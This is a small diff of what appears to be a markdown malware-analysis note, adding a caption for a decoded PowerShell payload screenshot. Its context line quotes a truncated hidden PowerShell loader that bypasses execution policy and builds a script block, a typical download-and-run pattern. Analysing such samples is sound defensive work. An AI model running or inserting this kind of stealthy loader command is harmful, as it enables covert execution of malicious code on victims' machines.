@@ -117,7 +117,8 @@ powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Obj
 ```
 ![[Pasted image 20230726212137.png]]
 
-
+Decoded payload from powershell
+![[Pasted image 20230726215139.png]]
 
 
 ___
